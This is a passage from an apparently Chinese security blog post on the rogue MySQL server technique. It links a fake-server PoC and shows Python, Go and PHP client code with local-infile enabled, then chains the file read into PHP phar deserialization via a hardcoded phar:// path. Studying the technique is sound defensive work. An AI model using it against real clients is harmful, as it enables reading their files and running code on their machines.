+<p>而客户端也没有主要索要上一次查询的结果，就将服务端请求的查询处理并返回了</p>
+<p>其实利用的点并不难，甚至可以说是mysql的一个特性。网上也大把现成<a href="https://github.com/fnmsd/MySQL_Fake_Server">poc</a>，主要是利用的版本非常全面</p>
+<p>但要注意的就是高版本之后默认使用的字符集为utf8mb4，需要手动修改为utf8</p>
+<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" spellcheck="false"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocapitalize="off" autocorrect="off" spellcheck="false" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class="CodeMirror-line" role="presentation"><span class="presentation" style="padding-right: 0.1px;">mysql -uroot -p --host=127.0.0.1 --port=3306 --default-character-set=utf8 --local-infile=1
+</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre>
+<p>在各个平台都是通用的，区别是需要各自配置LOCAL_INFILE权限</p>
+<p>python:</p>
+<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" spellcheck="false"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocapitalize="off" autocorrect="off" spellcheck="false" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class="CodeMirror-line" role="presentation"><span class="presentation" style="padding-right: 0.1px;">import mysql.connector
+
+config = {
+    'user': 'root',
+    'password': 'password',
+    'host': '192.168.2.3',
+    'port': '3306',
+    'charset': 'utf8',
+    'auth_plugin': 'mysql_native_password'
+}
+
+conn = mysql.connector.connect(**config)
+
+</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre>
+<p><img alt="image-20240411163025409" src="https://img.b1xcy.top/img/202404111630471.png?x-oss-process=style/img2webp"/></p>
+<p>go:</p>
+<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" spellcheck="false"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocapitalize="off" autocorrect="off" spellcheck="false" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class="CodeMirror-line" role="presentation"><span class="presentation" style="padding-right: 0.1px;">package main
+
+import (
+    "database/sql"
+    "fmt"
+    "github.com/go-sql-driver/mysql"
+)
+
+func main() {
+    cfg := mysql.Config{
+        User:                    "root",
+        Passwd:                  "1234",
+        Net:                     "tcp",
+        Addr:                    "192.168.2.3:3306",
+        DBName:                  "test",
+        Collation:               "utf8_general_ci",
+        AllowAllFiles:           true,
+        AllowCleartextPasswords: true,
+        CheckConnLiveness:       true,
+    }
+    db, err := sql.Open("mysql", cfg.FormatDSN())
+    if err != nil {
+        panic(err.Error())
+    }
+    if err := db.Ping(); err != nil {
+        fmt.Println("open database fail")
+        fmt.Println(err)
+        return
+    }
+    fmt.Println("connnect success")
+    defer db.Close()
+}
+
+
+</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre>
+<p><img alt="image-20240411173800277" src="https://img.b1xcy.top/img/202404111738333.png?x-oss-process=style/img2webp"/></p>
+<p>php:</p>
+<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" spellcheck="false"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocapitalize="off" autocorrect="off" spellcheck="false" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class="CodeMirror-line" role="presentation"><span class="presentation" style="padding-right: 0.1px;">&lt;?php
+$servername = "192.168.2.3";
+$username = "root";
+$password = "123456";
+$dbname = "test";
+$conn = new mysqli($servername, $username, $password, $dbname);
+if ($conn-&gt;connect_error) {
+    die("Connection failed: " . $conn-&gt;connect_error);
+}
+$conn-&gt;set_charset("utf8");
+$conn-&gt;options(MYSQLI_OPT_LOCAL_INFILE, true);
+$sql = "show tables;";
+if ($conn-&gt;query($sql) === TRUE) {
+    echo "Data loaded successfully";
+} else {
+    echo "Error loading data: " . $conn-&gt;error;
+}
+$conn-&gt;close();
+?&gt;
+
+</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre>
+<p><img alt="image-20240411172830371" src="https://img.b1xcy.top/img/202404111728436.png?x-oss-process=style/img2webp"/></p>
+<p>然而在php中远不止读文件这一个点可以打，甚至可以结合phar反序列化</p>
+<p>index.php:</p>
+<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" spellcheck="false"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocapitalize="off" autocorrect="off" spellcheck="false" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class="CodeMirror-line" role="presentation"><span class="presentation" style="padding-right: 0.1px;">&lt;?php
+class A{
+    public function __wakeup(){
+        echo "wake";
+    }
+}
+$servername = "192.168.2.3";
+$username = "root";
+$password = "123456";
+$dbname = "test";
+$conn = new mysqli($servername, $username, $password, $dbname);
+$conn-&gt;set_charset("utf8");
+$conn-&gt;options(MYSQLI_OPT_LOCAL_INFILE, true);
+if ($conn-&gt;connect_error) {
+    die("Connection failed: " . $conn-&gt;connect_error);
+}
+$sql = "show tables;";
+if ($conn-&gt;query($sql) === TRUE) {
+    echo "Data loaded successfully";
+} else {
+    echo "Error loading data: " . $conn-&gt;error;
+}
+$conn-&gt;close();
+?&gt;
+</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre>
+<p><img alt="image-20240411180955825" src="https://img.b1xcy.top/img/202404111809880.png?x-oss-process=style/img2webp"/></p>
+<p>在读取文件里写死<code>phar://./phar.phar</code>，在服务端读取<code>phar://./phar.phar</code>就类似于<code>file_get_content</code>，直接反序列化执行</p></div></div></body></html>
